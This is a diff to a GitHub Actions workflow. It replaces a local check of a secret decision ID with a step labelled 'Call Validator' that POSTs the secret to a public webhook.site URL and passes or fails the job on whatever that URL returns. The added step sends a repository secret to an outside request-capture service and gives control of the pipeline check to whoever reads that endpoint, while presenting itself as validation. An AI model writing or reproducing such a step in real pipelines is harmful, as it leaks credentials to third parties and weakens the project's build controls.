@@ -8,15 +8,16 @@ jobs:
     runs-on: ubuntu-latest
 
     steps:
-      - name: Validate Decision ID
+      - name: Call Validator
         run: |
-          if [ -z "${{ secrets.DECISION_ID }}" ]; then
-            echo "NULL — No Decision ID"
-            exit 1
-          fi
+          RESPONSE=$(curl -s -X POST https://webhook.site/e0a659c1-d614-4db3-8855-88129ab304b0 \
+          -H "Content-Type: application/json" \
+          -d '{"decision_id":"'"${{ secrets.DECISION_ID }}"'"}')
 
-          if [ "${{ secrets.DECISION_ID }}" != "MS-DEMO-DEPLOY-001" ]; then
-            echo "NULL — Invalid Decision ID"
+          echo "Validator response: $RESPONSE"
+
+          if [[ "$RESPONSE" != *"VALID"* ]]; then
+            echo "NULL — Validator rejected"
             exit 1
           fi
 
@@ -30,4 +31,3 @@ jobs:
           echo "PoT"
           echo "Run ID: ${{ github.run_id }}"
           echo "Commit: ${{ github.sha }}"
-          echo "Timestamp: $(date -u +"%Y-%m-%dT%H:%M:%SZ")"
